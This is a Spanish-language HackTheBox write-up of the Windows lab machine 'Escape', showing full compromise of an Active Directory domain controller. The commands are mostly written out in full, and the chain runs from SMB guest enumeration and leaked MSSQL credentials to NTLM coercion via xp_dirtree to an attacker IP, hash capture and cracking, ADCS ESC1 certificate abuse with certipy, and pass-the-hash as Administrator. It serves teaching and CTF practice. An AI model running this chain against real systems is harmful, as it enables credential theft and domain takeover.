---
icon: windows
---

# Escape

### Resumen

#### Detalles

| Campo                 | Detalle       |
| --------------------- | ------------- |
| **Nombre**            | Escape        |
| **Sistema Operativo** | Windows       |
| **Plataforma**        | HackTheBox    |
| **Fecha**             | 17/11/2026    |
| **IP Objetivo**       | 10.129.88.228 |

#### Executive Summary

La máquina **Escape** es un Controlador de Dominio de Active Directory (`sequel.htb`) comprometido a partir de un documento accesible en un recurso SMB público, que filtraba credenciales de una cuenta de solo lectura para Microsoft SQL Server. Desde esa sesión SQL, sin poder habilitar `xp_cmdshell`, se forzó una autenticación saliente del servidor hacia un servidor SMB controlado (`xp_dirtree`) y se capturó el hash NTLMv2 de la cuenta de servicio `sql_svc` con Responder. El hash se crackeó offline con `rockyou.txt`, dando acceso válido por SMB y WinRM.

Ya autenticado como `sql_svc`, los intentos de extracción de credenciales del dominio (`secretsdump` vía DRSUAPI y Kerberoasting dirigido) no fueron posibles con los permisos de esa cuenta. Revisando los registros del propio servicio SQL (`ERRORLOG.bak`) se encontró un intento de inicio de sesión fallido en el que, por error, se había introducido la contraseña en el campo de usuario, revelando en texto claro la contraseña real del usuario de dominio `Ryan.Cooper`.

Con `Ryan.Cooper` se obtuvo acceso por WinRM y la flag de usuario. La enumeración de Active Directory Certificate Services con `certipy` mostró que la plantilla `UserAuthentication` era vulnerable a **ESC1** (el solicitante puede especificar el SAN y el EKU permite autenticación de cliente), y que todos los usuarios del dominio tenían permiso de inscripción. Se solicitó un certificado suplantando el UPN `administrator@sequel.htb` y se usó para autenticarse, obteniendo el hash NTLM del Administrador y acceso total al dominio mediante Pass-the-Hash.

**Impacto:** compromiso total del dominio, por exposición de credenciales en un documento público, ausencia de protección frente a coerción de autenticación NTLM, una contraseña filtrada en texto claro en un log de aplicación y una plantilla de certificados mal configurada (ESC1).

#### Técnicas

* SMB Enumeration
* Information Disclosure (credenciales en documento de un recurso SMB público)
* NTLM Authentication Coercion (`xp_dirtree`) + Captura de hash (Responder)
* Cracking de hash NTLMv2 offline
* Credential Reuse (SMB / WinRM)
* Information Disclosure en log de aplicación (`ERRORLOG.bak`)
* Abuso de Active Directory Certificate Services — **ESC1**
* Pass-the-Hash

### Information Gathering

#### Port Scanning

**TCP**

```bash
> sudo nmap -sS -Pn -n -vv -p- --min-rate 5000 10.129.88.228 -oG allPorts
> nmap -sCV -Pn -n -v -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49666,49691,49692,49704,49713,50352 10.129.88.228
```

| Puerto       | Servicio     | Versión                                          |
| ------------ | ------------ | ------------------------------------------------ |
| 53/tcp       | domain       | Simple DNS Plus                                  |
| 88/tcp       | kerberos-sec | Microsoft Windows Kerberos                       |
| 135/tcp      | msrpc        | Microsoft Windows RPC                            |
| 139/tcp      | netbios-ssn  | Microsoft Windows netbios-ssn                    |
| 389/tcp      | ldap         | Active Directory LDAP (Domain: sequel.htb)       |
| 445/tcp      | microsoft-ds | —                                                |
| 464/tcp      | kpasswd5     | —                                                |
| 593/tcp      | ncacn\_http  | Microsoft Windows RPC over HTTP 1.0              |
| 636/tcp      | ssl/ldap     | Active Directory LDAP (Domain: sequel.htb)       |
| **1433/tcp** | **ms-sql-s** | **Microsoft SQL Server 2019 15.00.2000.00; RTM** |
| 3268/tcp     | ldap         | Active Directory LDAP (Global Catalog)           |
| 3269/tcp     | ssl/ldap     | Active Directory LDAP (Global Catalog, SSL)      |
| 5985/tcp     | http         | Microsoft HTTPAPI httpd 2.0 (WinRM)              |
| 9389/tcp     | mc-nmf       | .NET Message Framing (AD Web Services)           |

Confirmado Domain Controller de `sequel.htb` (hostname `DC`), con MSSQL expuesto directamente en el controlador de dominio — superficie de ataque poco habitual y punto de partida evidente.

#### Enumeration

**SMB / RID Brute Force**

Sesión nula sin resultados; con `guest` sí fue posible enumerar usuarios por RID brute force:

```bash
> nxc smb 10.129.88.228 -u '' -p '' --rid-brute
[sin resultados, NULL AUTH no permitido]

> nxc smb 10.129.88.228 -u 'guest' -p '' --rid-brute
500: sequel\Administrator (SidTypeUser)
1103: sequel\Tom.Henn (SidTypeUser)
1104: sequel\Brandon.Brown (SidTypeUser)
1105: sequel\Ryan.Cooper (SidTypeUser)
1106: sequel\sql_svc (SidTypeUser)
1107: sequel\James.Roberts (SidTypeUser)
1108: sequel\Nicole.Thompson (SidTypeUser)
```

Con la lista de usuarios se comprobaron AS-REP Roasting y Kerberoasting sin autenticar: ningún usuario tenía `UF_DONT_REQUIRE_PREAUTH` activado, y la petición de tickets de servicio sin bind autenticado fue rechazada por LDAP. Ninguna de las dos vías era explotable en este punto.

Enumerando shares con `guest`, el recurso `Public` permitía lectura:

```bash
> nxc smb 10.129.88.228 -u 'guest' -p '' --shares
Public          READ

> smbmap -H 10.129.88.228 -u 'guest' -p '' -r Public
SQL Server Procedures.pdf
```

El documento (dirigido a empleados nuevos como guía de acceso a la base de datos) incluía al final unas credenciales de prueba:

<figure><img src="../../../.gitbook/assets/SQL Server Procedures.pdf — credenciales PublicUser filtradas en el documento pú.png" alt=""><figcaption></figcaption></figure>

_SQL Server Procedures.pdf — credenciales PublicUser filtradas en el documento público_

```
Usuario: PublicUser
Contraseña: GuestUserCantWrite1
```

Credenciales válidas contra el servicio MSSQL:

```bash
> nxc mssql 10.129.88.228 -u "PublicUser" -p "GuestUserCantWrite1" --local-auth
[+] DC\PublicUser:GuestUserCantWrite1
```

### Explotación

#### Foothold

* **Vulnerabilidad:** Exposición de credenciales en documento público + abuso de `xp_dirtree` en MSSQL para forzar autenticación NTLM saliente, capturada y crackeada offline.
* **Exploit:** `mssqlclient.py` / consola SQL, `responder`, `john`.
* **Procedimiento:**

1. Conectado como `PublicUser`, se intentó habilitar `xp_cmdshell` sin éxito (sin permisos):

```sql
SQL (PublicUser  guest@master)> enable_xp_cmdshell
ERROR(DC\SQLMOCK): User does not have permission to perform this action.
```

2. Se enumeraron bases de datos y versión del servidor:

```sql
SQL (PublicUser  guest@master)> enum_db
master   tempdb   model   msdb

SQL (PublicUser  guest@master)> select @@version;
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
```

3. Sin `xp_cmdshell`, se forzó al servidor a autenticarse contra un recurso SMB controlado mediante `xp_dirtree`, con Responder escuchando en la VPN:

```bash
> sudo responder -I tun0
```

```sql
SQL (PublicUser  guest@master)> exec master.dbo.xp_dirtree "\\10.10.14.108\test"
```

<figure><img src="../../../.gitbook/assets/Responder capturando el hash NTLMv2 de sequel-sql_svc.png" alt=""><figcaption></figcaption></figure>

_Responder capturando el hash NTLMv2 de sequel\sql\_svc_

4. El hash capturado se crackeó offline con `rockyou.txt`:

```bash
> john --wordlist=/usr/share/wordlists/rockyou.txt sql_svc.ntlm.hash
REGGIE1234ronnie (sql_svc)
```

5. Se validaron las credenciales, con acceso también por WinRM:

```bash
> nxc smb 10.129.88.228 -u "sql_svc" -p 'REGGIE1234ronnie'
[+] sequel.htb\sql_svc:REGGIE1234ronnie

> nxc winrm 10.129.88.228 -u "sql_svc" -p 'REGGIE1234ronnie'
[+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)
```

```bash
> evil-winrm -i 10.129.88.228 -u 'sql_svc' -p 'REGGIE1234ronnie'
```

#### Privesc

* **Vulnerabilidad:** Credencial en texto claro filtrada en un log de aplicación (`ERRORLOG.bak`), reutilizada para acceder como usuario de dominio; plantilla de certificados `UserAuthentication` vulnerable a **ESC1**.
* **Exploit:** revisión manual de logs, `certipy`.
* **Procedimiento:**

1. Como `sql_svc`, se intentó extraer las credenciales del dominio directamente (`secretsdump` vía DRSUAPI) y Kerberoasting dirigido contra el propio `sql_svc`: ninguna de las dos vías funcionó con los permisos de esta cuenta.
2. Revisando los logs de SQL Server se encontró un backup del log de errores con un intento de inicio de sesión fallido:

```
C:\SQLServer\Logs\ERRORLOG.bak
```

<figure><img src="../../../.gitbook/assets/ERRORLOG.bak intento de login fallido donde la contraseña se introdujo por erro.png" alt=""><figcaption></figcaption></figure>

_ERRORLOG.bak: intento de login fallido donde la contraseña se introdujo por error como usuario_

Un intento de login para `Ryan.Cooper` fue seguido inmediatamente de otro intento con el usuario literal `NuclearMosquito3`: un fallo típico de tecleo (contraseña escrita en el campo de usuario) que revela la contraseña real de `Ryan.Cooper`.

3. Se confirmó la credencial y se accedió por WinRM:

```bash
> nxc smb 10.129.88.228 -u 'Ryan.Cooper' -p 'NuclearMosquito3'
[+] sequel.htb\Ryan.Cooper:NuclearMosquito3

> evil-winrm -i 10.129.88.228 -u 'Ryan.Cooper' -p 'NuclearMosquito3'
```

* **Evidencia:** (`user.txt`)

<figure><img src="../../../.gitbook/assets/Lectura de user.txt como Ryan.Cooper.png" alt=""><figcaption></figcaption></figure>

&#x20;_Lectura de user.txt como Ryan.Cooper_

4. Con credenciales de dominio válidas, se enumeró AD Certificate Services en busca de plantillas vulnerables:

```bash
> certipy find -u ryan.cooper@sequel.htb -p NuclearMosquito3 -vulnerable
```

```
Template Name              : UserAuthentication
Enrollee Supplies Subject  : True
Extended Key Usage         : Client Authentication, Secure Email, Encrypting File System
Enrollment Rights          : SEQUEL.HTB\Domain Users
[!] Vulnerabilities
  ESC1                     : Enrollee supplies subject and template allows client authentication.
```

Cualquier usuario del dominio (`Domain Users`) puede solicitar un certificado de esta plantilla especificando el SAN (Subject Alternative Name) a su elección, y el certificado resultante permite autenticación de cliente.

5. Se solicitó un certificado suplantando al Administrador:

```bash
> certipy req -u Ryan.Cooper@sequel.htb -p 'NuclearMosquito3' -dc-ip 10.129.88.228 \
  -target dc.sequel.htb -ca 'sequel-DC-CA' -template 'UserAuthentication' \
  -upn administrator@sequel.htb -debug
```

<figure><img src="../../../.gitbook/assets/certipy solicitando el certificado con UPN administrator@sequel.htb.png" alt=""><figcaption></figcaption></figure>

_certipy solicitando el certificado con UPN administrator@sequel.htb_

6. Se usó el certificado para autenticarse por Kerberos PKINIT y obtener el hash NTLM del Administrador:

```bash
> certipy auth -pfx administrator.pfx -dc-ip 10.129.88.228
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```

7. Acceso como `Administrator` mediante Pass-the-Hash y lectura de la flag de root:

```bash
> evil-winrm -i 10.129.88.228 -u 'Administrator' -H 'a52f78e4c751e5f5e17e1e9f3e58f4ee'
```

* **Evidencia:** (`root.txt`)

<figure><img src="../../../.gitbook/assets/Acceso como Administrator por Pass-the-Hash y lectura de root.txt.png" alt=""><figcaption></figcaption></figure>

_Acceso como Administrator por Pass-the-Hash y lectura de root.txt_

***

#### Notes

* Antes de operaciones Kerberos (Kerberoasting, PKINIT con `certipy`) se sincronizó el reloj con el DC para evitar errores de reloj:

```bash
sudo rdate -n 10.129.88.228
```

* El acceso a MSSQL directamente en el Controlador de Dominio fue, según el propio documento `SQL Server Procedures.pdf`, una instancia de prueba dejada temporalmente por error ("mock instance") — explica por qué el servicio de base de datos estaba expuesto en un DC.
